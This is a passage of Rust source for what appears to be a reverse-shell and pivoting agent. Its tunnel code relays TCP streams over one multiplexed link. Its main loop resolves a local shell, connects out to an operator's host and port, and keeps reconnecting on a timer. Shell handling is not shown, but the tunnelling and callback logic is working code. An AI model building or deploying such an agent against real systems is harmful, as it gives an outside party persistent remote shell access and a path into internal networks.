    let _ = dest.set_read_timeout(Some(Duration::from_secs(1)));
    let _ = dest.set_write_timeout(Some(Duration::from_secs(10)));
    let bound = dest.local_addr().ok().map(|a| a.to_string());

    let read_dest = match dest.try_clone() {
        Ok(d) => d,
        Err(e) => return fail(st, e.raw_os_error(), &format!("clone failed: {e}")),
    };

    let shared = Arc::new(TunnelShared::new());
    // The writer thread owns the socket's write half; the reader thread gets a
    // clone.  Announce the stream *before* the reader can enqueue any
    // TUNNEL_DATA frame: both producers share one FIFO queue and the server
    // requires TUNNEL_OPENED to be the first event of a stream (otherwise a
    // destination that speaks first would race it and reset the tunnel).
    let tx = spawn_tunnel_writer(dest, Arc::clone(&shared));
    st.streams.insert(stream_id, TunnelHandle { tx, shared: Arc::clone(&shared) });
    send_json(
        &st.out,
        FRAME_TUNNEL_OPENED,
        &TunnelOpened { stream_id, ok: true, bound, errno: None, message: None },
    )?;
    spawn_tunnel_reader(stream_id, read_dest, st.out.clone(), shared, st.opts.idle_timeout);
    Ok(())
}

fn spawn_tunnel_reader(
    stream_id: u32,
    mut dest: TcpStream,
    out: SyncSender<Outbound>,
    shared: Arc<TunnelShared>,
    idle_timeout: Duration,
) {
    thread::spawn(move || {
        let mut buf = [0_u8; MAX_TUNNEL_DATA];
        loop {
            if shared.closing.load(Ordering::SeqCst) {
                break;
            }
            match dest.read(&mut buf) {
                Ok(0) => {
                    shared.closed_read.store(true, Ordering::SeqCst);
                    let _ = out.send((FRAME_TUNNEL_EOF, stream_id.to_le_bytes().to_vec()));
                    break;
                }
                Ok(n) => {
                    shared.touch();
                    let payload = tunnel_data_payload(stream_id, &buf[..n]);
                    if out.send((FRAME_TUNNEL_DATA, payload)).is_err() {
                        shared.set_closing("writer gone");
                        break;
                    }
                }
                Err(ref e)
                    if e.kind() == std::io::ErrorKind::WouldBlock
                        || e.kind() == std::io::ErrorKind::TimedOut =>
                {
                    if shared.idle_for() > idle_timeout {
                        shared.set_closing("idle timeout");
                        break;
                    }
                }
                Err(_) => {
                    shared.set_closing("read failed");
                    break;
                }
            }
        }
    });
}

fn tunnel_write(st: &mut SessionState, stream_id: u32, bytes: &[u8]) {
    let Some(handle) = st.streams.get_mut(&stream_id) else {
        return;
    };
    if handle.shared.closed_write.load(Ordering::SeqCst) {
        return;
    }
    match handle.tx.try_send(TunnelCmd::Data(bytes.to_vec())) {
        Ok(()) => {}
        Err(TrySendError::Full(_)) => {
            // The destination cannot keep up.  The link is multiplexed, so
            // per-stream TCP backpressure is unavailable: reset this stream
            // (with a reason) rather than stalling every other stream.
            handle.shared.set_closing("stream stalled");
        }
        Err(TrySendError::Disconnected(_)) => handle.shared.set_closing("writer gone"),
    }
}

fn tunnel_shutdown_write(st: &mut SessionState, stream_id: u32) {
    let Some(handle) = st.streams.get_mut(&stream_id) else {
        return;
    };
    if handle.shared.closed_write.load(Ordering::SeqCst) {
        return;
    }
    match handle.tx.try_send(TunnelCmd::ShutdownWrite) {
        Ok(()) => handle.shared.touch(),
        Err(TrySendError::Full(_)) => handle.shared.set_closing("stream stalled"),
        Err(TrySendError::Disconnected(_)) => handle.shared.set_closing("writer gone"),
    }
}

fn tunnel_remote_close(st: &mut SessionState, stream_id: u32) {
    let Some(handle) = st.streams.get_mut(&stream_id) else {
        return;
    };
    handle.shared.remote_closed.store(true, Ordering::SeqCst);
    // `Close` discards queued data and shuts the socket down.  If the queue is
    // full the reaper closes the stream on its next tick anyway.
    let _ = handle.tx.try_send(TunnelCmd::Close);
}

// ── Main ────────────────────────────────────────────────────────────────────

fn main() -> Result<()> {
    let args = Args::parse();
    let shell = Arc::new(resolve_shell(args.shell.as_deref()));
    let addr = format!("{}:{}", args.host, args.port);
    loop {
        eprintln!("[+] Connecting to {addr} ...");
        match TcpStream::connect(&addr) {
            Ok(stream) => {
                let opts = RunOpts {
                    server_host: args.host.clone(),
                    server_port: args.port,
                    server_ip: stream.peer_addr().ok().map(|a| a.ip()),
                    max_streams: args.max_streams,
                    idle_timeout: Duration::from_secs(args.idle_timeout.max(1)),
                };
                if let Err(e) = run_session(stream, Arc::clone(&shell), opts) {
                    eprintln!("[-] Session error: {e}");
                }
            }
            Err(e) => {
                eprintln!("[-] Connection failed: {e}");
            }
        }
        if args.no_reconnect {
            break;
        }
        thread::sleep(Duration::from_secs_f64(args.poll_interval.max(1.0)));
    }
    Ok(())
}
